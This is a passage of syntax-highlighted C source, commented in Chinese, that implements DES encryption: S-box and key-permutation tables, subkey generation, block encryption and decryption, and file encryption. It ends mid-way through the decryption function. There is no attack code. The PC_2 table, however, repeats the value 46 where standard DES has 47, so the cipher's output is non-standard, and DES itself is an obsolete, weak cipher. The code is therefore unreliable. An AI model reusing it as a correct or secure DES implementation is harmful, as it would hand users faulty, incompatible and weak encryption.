class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>&#125;,  </div><div class="line">              &#123;<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S6  </span></div><div class="line">              &#123;&#123;<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>&#125;,  </div><div class="line">              &#123;<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>&#125;,  </div><div class="line">              &#123;<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>&#125;,  </div><div class="line">              &#123;<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S7  </span></div><div class="line">              &#123;&#123;<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>&#125;,  </div><div class="line">              &#123;<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>&#125;,  </div><div class="line">              &#123;<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </div><div class="line">              &#123;<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>&#125;&#125;,  </div><div class="line">              <span class="comment">//S8  </span></div><div class="line">              &#123;&#123;<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>&#125;,  </div><div class="line">              &#123;<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>&#125;,  </div><div class="line">              &#123;<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>&#125;,  </div><div class="line">              &#123;<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>&#125;&#125;&#125;;  </div><div class="line"><span class="comment">//置换选择1  </span></div><div class="line"><span class="keyword">int</span> PC_1[<span class="number">56</span>] = &#123;<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,  </div><div class="line">              <span class="number">0</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,  </div><div class="line">              <span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,  </div><div class="line">              <span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,  </div><div class="line">              <span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,  </div><div class="line">              <span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,  </div><div class="line">              <span class="number">13</span>,<span class="number">5</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,  </div><div class="line">              <span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//置换选择2  </span></div><div class="line"><span class="keyword">int</span> PC_2[<span class="number">48</span>] = &#123;<span class="number">13</span>,<span class="number">16</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">27</span>,  </div><div class="line">              <span class="number">14</span>,<span class="number">5</span>,<span class="number">20</span>,<span class="number">9</span>,<span class="number">22</span>,<span class="number">18</span>,<span class="number">11</span>,<span class="number">3</span>,  </div><div class="line">              <span class="number">25</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">26</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">1</span>,  </div><div class="line">              <span class="number">40</span>,<span class="number">51</span>,<span class="number">30</span>,<span class="number">36</span>,<span class="number">46</span>,<span class="number">54</span>,<span class="number">29</span>,<span class="number">39</span>,  </div><div class="line">              <span class="number">50</span>,<span class="number">44</span>,<span class="number">32</span>,<span class="number">46</span>,<span class="number">43</span>,<span class="number">48</span>,<span class="number">38</span>,<span class="number">55</span>,  </div><div class="line">              <span class="number">33</span>,<span class="number">52</span>,<span class="number">45</span>,<span class="number">41</span>,<span class="number">49</span>,<span class="number">35</span>,<span class="number">28</span>,<span class="number">31</span>&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//对左移次数的规定  </span></div><div class="line"><span class="keyword">int</span> MOVE_TIMES[<span class="number">16</span>] = &#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;  </div><div class="line"></div><div class="line"><span class="comment">//字节转换成二进制  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">ByteToBit</span><span class="params">(ElemType ch, ElemType bit[<span class="number">8</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>;cnt &lt; <span class="number">8</span>; cnt++)&#123;  </div><div class="line">        *(bit+cnt) = (ch&gt;&gt;cnt)&amp;<span class="number">1</span>;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//二进制转换成字节  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">BitToByte</span><span class="params">(ElemType bit[<span class="number">8</span>],ElemType *ch)</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>;cnt &lt; <span class="number">8</span>; cnt++)&#123;  </div><div class="line">        *ch |= *(bit + cnt)&lt;&lt;cnt;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//将长度为8的字符串转为二进制位串  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Char8ToBit64</span><span class="params">(ElemType ch[<span class="number">8</span>],ElemType bit[<span class="number">64</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">8</span>; cnt++)&#123;          </div><div class="line">        ByteToBit(*(ch+cnt),bit+(cnt&lt;&lt;<span class="number">3</span>));  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//将二进制位串转为长度为8的字符串  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">Bit64ToChar8</span><span class="params">(ElemType bit[<span class="number">64</span>],ElemType ch[<span class="number">8</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="built_in">memset</span>(ch,<span class="number">0</span>,<span class="number">8</span>);  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">8</span>; cnt++)&#123;  </div><div class="line">        BitToByte(bit+(cnt&lt;&lt;<span class="number">3</span>),ch+cnt);  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//生成子密钥  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_MakeSubKeys</span><span class="params">(ElemType key[<span class="number">64</span>],ElemType subKeys[<span class="number">16</span>][<span class="number">48</span>])</span></span>&#123;  </div><div class="line">    ElemType temp[<span class="number">56</span>];  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    DES_PC1_Transform(key,temp);<span class="comment">//PC1置换  </span></div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">16</span>; cnt++)&#123;<span class="comment">//16轮跌代，产生16个子密钥  </span></div><div class="line">        DES_ROL(temp,MOVE_TIMES[cnt]);<span class="comment">//循环左移  </span></div><div class="line">        DES_PC2_Transform(temp,subKeys[cnt]);<span class="comment">//PC2置换，产生子密钥  </span></div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//密钥置换1  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_PC1_Transform</span><span class="params">(ElemType key[<span class="number">64</span>], ElemType tempbts[<span class="number">56</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;      </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">56</span>; cnt++)&#123;  </div><div class="line">        tempbts[cnt] = key[PC_1[cnt]];  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//密钥置换2  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_PC2_Transform</span><span class="params">(ElemType key[<span class="number">56</span>], ElemType tempbts[<span class="number">48</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">48</span>; cnt++)&#123;  </div><div class="line">        tempbts[cnt] = key[PC_2[cnt]];  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//循环左移  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_ROL</span><span class="params">(ElemType data[<span class="number">56</span>], <span class="keyword">int</span> time)</span></span>&#123;     </div><div class="line">    ElemType temp[<span class="number">56</span>];  </div><div class="line">  </div><div class="line">    <span class="comment">//保存将要循环移动到右边的位  </span></div><div class="line">    <span class="built_in">memcpy</span>(temp,data,time);  </div><div class="line">    <span class="built_in">memcpy</span>(temp+time,data+<span class="number">28</span>,time);  </div><div class="line">      </div><div class="line">    <span class="comment">//前28位移动  </span></div><div class="line">    <span class="built_in">memcpy</span>(data,data+time,<span class="number">28</span>-time);  </div><div class="line">    <span class="built_in">memcpy</span>(data+<span class="number">28</span>-time,temp,time);  </div><div class="line">  </div><div class="line">    <span class="comment">//后28位移动  </span></div><div class="line">    <span class="built_in">memcpy</span>(data+<span class="number">28</span>,data+<span class="number">28</span>+time,<span class="number">28</span>-time);  </div><div class="line">    <span class="built_in">memcpy</span>(data+<span class="number">56</span>-time,temp+time,time);      </div><div class="line">  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//IP置换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_IP_Transform</span><span class="params">(ElemType data[<span class="number">64</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    ElemType temp[<span class="number">64</span>];  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">64</span>; cnt++)&#123;  </div><div class="line">        temp[cnt] = data[IP_Table[cnt]];  </div><div class="line">    &#125;  </div><div class="line">    <span class="built_in">memcpy</span>(data,temp,<span class="number">64</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//IP逆置换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_IP_1_Transform</span><span class="params">(ElemType data[<span class="number">64</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    ElemType temp[<span class="number">64</span>];  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">64</span>; cnt++)&#123;  </div><div class="line">        temp[cnt] = data[IP_1_Table[cnt]];  </div><div class="line">    &#125;  </div><div class="line">    <span class="built_in">memcpy</span>(data,temp,<span class="number">64</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//扩展置换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_E_Transform</span><span class="params">(ElemType data[<span class="number">48</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    ElemType temp[<span class="number">48</span>];  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">48</span>; cnt++)&#123;  </div><div class="line">        temp[cnt] = data[E_Table[cnt]];  </div><div class="line">    &#125;     </div><div class="line">    <span class="built_in">memcpy</span>(data,temp,<span class="number">48</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//P置换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_P_Transform</span><span class="params">(ElemType data[<span class="number">32</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    ElemType temp[<span class="number">32</span>];  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">32</span>; cnt++)&#123;  </div><div class="line">        temp[cnt] = data[P_Table[cnt]];  </div><div class="line">    &#125;     </div><div class="line">    <span class="built_in">memcpy</span>(data,temp,<span class="number">32</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//异或  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_XOR</span><span class="params">(ElemType R[<span class="number">48</span>], ElemType L[<span class="number">48</span>] ,<span class="keyword">int</span> count)</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; count; cnt++)&#123;  </div><div class="line">        R[cnt] ^= L[cnt];  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//S盒置换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_SBOX</span><span class="params">(ElemType data[<span class="number">48</span>])</span></span>&#123;  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">    <span class="keyword">int</span> line,row,output;  </div><div class="line">    <span class="keyword">int</span> cur1,cur2;  </div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">8</span>; cnt++)&#123;  </div><div class="line">        cur1 = cnt*<span class="number">6</span>;  </div><div class="line">        cur2 = cnt&lt;&lt;<span class="number">2</span>;  </div><div class="line">          </div><div class="line">        <span class="comment">//计算在S盒中的行与列  </span></div><div class="line">        line = (data[cur1]&lt;&lt;<span class="number">1</span>) + data[cur1+<span class="number">5</span>];  </div><div class="line">        row = (data[cur1+<span class="number">1</span>]&lt;&lt;<span class="number">3</span>) + (data[cur1+<span class="number">2</span>]&lt;&lt;<span class="number">2</span>)  </div><div class="line">            + (data[cur1+<span class="number">3</span>]&lt;&lt;<span class="number">1</span>) + data[cur1+<span class="number">4</span>];  </div><div class="line">        output = S[cnt][line][row];  </div><div class="line">  </div><div class="line">        <span class="comment">//化为2进制  </span></div><div class="line">        data[cur2] = (output&amp;<span class="number">0X08</span>)&gt;&gt;<span class="number">3</span>;  </div><div class="line">        data[cur2+<span class="number">1</span>] = (output&amp;<span class="number">0X04</span>)&gt;&gt;<span class="number">2</span>;  </div><div class="line">        data[cur2+<span class="number">2</span>] = (output&amp;<span class="number">0X02</span>)&gt;&gt;<span class="number">1</span>;  </div><div class="line">        data[cur2+<span class="number">3</span>] = output&amp;<span class="number">0x01</span>;  </div><div class="line">    &#125;     </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//交换  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_Swap</span><span class="params">(ElemType left[<span class="number">32</span>], ElemType right[<span class="number">32</span>])</span></span>&#123;  </div><div class="line">    ElemType temp[<span class="number">32</span>];  </div><div class="line">    <span class="built_in">memcpy</span>(temp,left,<span class="number">32</span>);     </div><div class="line">    <span class="built_in">memcpy</span>(left,right,<span class="number">32</span>);    </div><div class="line">    <span class="built_in">memcpy</span>(right,temp,<span class="number">32</span>);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//加密单个分组  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_EncryptBlock</span><span class="params">(ElemType plainBlock[<span class="number">8</span>], ElemType subKeys[<span class="number">16</span>][<span class="number">48</span>], ElemType cipherBlock[<span class="number">8</span>])</span></span>&#123;  </div><div class="line">    ElemType plainBits[<span class="number">64</span>];  </div><div class="line">    ElemType copyRight[<span class="number">48</span>];  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">  </div><div class="line">    Char8ToBit64(plainBlock,plainBits);       </div><div class="line">    <span class="comment">//初始置换（IP置换）  </span></div><div class="line">    DES_IP_Transform(plainBits);  </div><div class="line">  </div><div class="line">    <span class="comment">//16轮迭代  </span></div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">0</span>; cnt &lt; <span class="number">16</span>; cnt++)&#123;         </div><div class="line">        <span class="built_in">memcpy</span>(copyRight,plainBits+<span class="number">32</span>,<span class="number">32</span>);  </div><div class="line">        <span class="comment">//将右半部分进行扩展置换，从32位扩展到48位  </span></div><div class="line">        DES_E_Transform(copyRight);  </div><div class="line">        <span class="comment">//将右半部分与子密钥进行异或操作  </span></div><div class="line">        DES_XOR(copyRight,subKeys[cnt],<span class="number">48</span>);   </div><div class="line">        <span class="comment">//异或结果进入S盒，输出32位结果  </span></div><div class="line">        DES_SBOX(copyRight);  </div><div class="line">        <span class="comment">//P置换  </span></div><div class="line">        DES_P_Transform(copyRight);  </div><div class="line">        <span class="comment">//将明文左半部分与右半部分进行异或  </span></div><div class="line">        DES_XOR(plainBits,copyRight,<span class="number">32</span>);  </div><div class="line">        <span class="keyword">if</span>(cnt != <span class="number">15</span>)&#123;  </div><div class="line">            <span class="comment">//最终完成左右部的交换  </span></div><div class="line">            DES_Swap(plainBits,plainBits+<span class="number">32</span>);  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    <span class="comment">//逆初始置换（IP^1置换）  </span></div><div class="line">    DES_IP_1_Transform(plainBits);  </div><div class="line">    Bit64ToChar8(plainBits,cipherBlock);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//解密单个分组  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_DecryptBlock</span><span class="params">(ElemType cipherBlock[<span class="number">8</span>], ElemType subKeys[<span class="number">16</span>][<span class="number">48</span>],ElemType plainBlock[<span class="number">8</span>])</span></span>&#123;  </div><div class="line">    ElemType cipherBits[<span class="number">64</span>];  </div><div class="line">    ElemType copyRight[<span class="number">48</span>];  </div><div class="line">    <span class="keyword">int</span> cnt;  </div><div class="line">  </div><div class="line">    Char8ToBit64(cipherBlock,cipherBits);         </div><div class="line">    <span class="comment">//初始置换（IP置换）  </span></div><div class="line">    DES_IP_Transform(cipherBits);  </div><div class="line">      </div><div class="line">    <span class="comment">//16轮迭代  </span></div><div class="line">    <span class="keyword">for</span>(cnt = <span class="number">15</span>; cnt &gt;= <span class="number">0</span>; cnt--)&#123;        </div><div class="line">        <span class="built_in">memcpy</span>(copyRight,cipherBits+<span class="number">32</span>,<span class="number">32</span>);  </div><div class="line">        <span class="comment">//将右半部分进行扩展置换，从32位扩展到48位  </span></div><div class="line">        DES_E_Transform(copyRight);  </div><div class="line">        <span class="comment">//将右半部分与子密钥进行异或操作  </span></div><div class="line">        DES_XOR(copyRight,subKeys[cnt],<span class="number">48</span>);       </div><div class="line">        <span class="comment">//异或结果进入S盒，输出32位结果  </span></div><div class="line">        DES_SBOX(copyRight);  </div><div class="line">        <span class="comment">//P置换  </span></div><div class="line">        DES_P_Transform(copyRight);       </div><div class="line">        <span class="comment">//将明文左半部分与右半部分进行异或  </span></div><div class="line">        DES_XOR(cipherBits,copyRight,<span class="number">32</span>);  </div><div class="line">        <span class="keyword">if</span>(cnt != <span class="number">0</span>)&#123;  </div><div class="line">            <span class="comment">//最终完成左右部的交换  </span></div><div class="line">            DES_Swap(cipherBits,cipherBits+<span class="number">32</span>);  </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    <span class="comment">//逆初始置换（IP^1置换）  </span></div><div class="line">    DES_IP_1_Transform(cipherBits);  </div><div class="line">    Bit64ToChar8(cipherBits,plainBlock);  </div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//加密文件  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_Encrypt</span><span class="params">(<span class="keyword">char</span> *plainFile, <span class="keyword">char</span> *keyStr,<span class="keyword">char</span> *cipherFile)</span></span>&#123;  </div><div class="line">    FILE *plain,*cipher;  </div><div class="line">    <span class="keyword">int</span> count;  </div><div class="line">    ElemType plainBlock[<span class="number">8</span>],cipherBlock[<span class="number">8</span>],keyBlock[<span class="number">8</span>];  </div><div class="line">    ElemType bKey[<span class="number">64</span>];  </div><div class="line">    ElemType subKeys[<span class="number">16</span>][<span class="number">48</span>];  </div><div class="line">    <span class="keyword">if</span>((plain = fopen(plainFile,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)&#123;  </div><div class="line">        <span class="keyword">return</span> PLAIN_FILE_OPEN_ERROR;  </div><div class="line">    &#125;     </div><div class="line">    <span class="keyword">if</span>((cipher = fopen(cipherFile,<span class="string">"wb"</span>)) == <span class="literal">NULL</span>)&#123;  </div><div class="line">        <span class="keyword">return</span> CIPHER_FILE_OPEN_ERROR;  </div><div class="line">    &#125;  </div><div class="line">    <span class="comment">//设置密钥  </span></div><div class="line">    <span class="built_in">memcpy</span>(keyBlock,keyStr,<span class="number">8</span>);  </div><div class="line">    <span class="comment">//将密钥转换为二进制流  </span></div><div class="line">    Char8ToBit64(keyBlock,bKey);  </div><div class="line">    <span class="comment">//生成子密钥  </span></div><div class="line">    DES_MakeSubKeys(bKey,subKeys);  </div><div class="line">      </div><div class="line">    <span class="keyword">while</span>(!feof(plain))&#123;  </div><div class="line">        <span class="comment">//每次读8个字节，并返回成功读取的字节数  </span></div><div class="line">        <span class="keyword">if</span>((count = fread(plainBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,plain)) == <span class="number">8</span>)&#123;  </div><div class="line">            DES_EncryptBlock(plainBlock,subKeys,cipherBlock);  </div><div class="line">            fwrite(cipherBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,cipher);    </div><div class="line">        &#125;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">if</span>(count)&#123;  </div><div class="line">        <span class="comment">//填充  </span></div><div class="line">        <span class="built_in">memset</span>(plainBlock + count,<span class="string">'\0'</span>,<span class="number">7</span> - count);  </div><div class="line">        <span class="comment">//最后一个字符保存包括最后一个字符在内的所填充的字符数量  </span></div><div class="line">        plainBlock[<span class="number">7</span>] = <span class="number">8</span> - count;  </div><div class="line">        DES_EncryptBlock(plainBlock,subKeys,cipherBlock);  </div><div class="line">        fwrite(cipherBlock,<span class="keyword">sizeof</span>(<span class="keyword">char</span>),<span class="number">8</span>,cipher);  </div><div class="line">    &#125;  </div><div class="line">    fclose(plain);  </div><div class="line">    fclose(cipher);  </div><div class="line">    <span class="keyword">return</span> OK;  </div><div class="line">&#125;  </div><div class="line">  </div><div class="line"><span class="comment">//解密文件  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">DES_Decrypt</span><span class="params">(<span class="keyword">char</span> *cipherFile, <span class="keyword">char</span> *keyStr,<span class="keyword">char</span> *plainFile)</span></span>&#123;  </div><div class="line">    FILE *plain, *cipher;  </div><div class="line">    <span class="keyword">int</span> count,times = <span class="number">0</span>;  </div><div class="line">    <span class="keyword">long</span> fileLen;  </div><div class="line">    ElemType plainBlock[<span class="number">8</span>],cipherBlock[<span class="number">8</span>],keyBlock[<span class="number">8</span>];  </div><div class="line">    ElemType bKey[<span class="number">64</span>];  </div><div class="line">    ElemType subKeys[<span class="number">16</span>][<span class="number">48</span>];  </div><div class="line">    <span class="keyword">if</span>((cipher = fopen(cipherFile,<span class="string">"rb"</span>)) == <span class="literal">NULL</span>)&#123;  </div><div class="line">        <span class="keyword">return</span> CIPHER_FILE_OPEN_ERROR;  </div><div class="line">    &#125;  </div><div class="line">    <span class="keyword">if</span>((plain = fopen(plainFile,<span class="string">"wb"</span>)) == <span class="literal">NULL</span>)&#123;  </div><div class="line">        <span class="keyword">return</span> PLAIN_FILE_OPEN_ERROR;  </div><div class="line">    &#125;  </div><div class="line">  </div><div class="line">    <span class="comment">//设置密钥  </span></div><div class="line">    <span class="built_in">memcpy</span>(keyBlock,keyStr,<span class="number">8</span>);  </div><div class="line">    <span class="comment">//将密钥转换为二进制流  </span></div><div class="line">    Char8ToBit64(keyBlock,bKey);  </div><div class="line">    <span class="comment">//生成子密钥  </span></div><div class="line">    DES_MakeSubKeys(bKey,subKeys);  </div><div class="line">  </div><div class="line">    <span class="comment">//取文件长度   </span></div><div 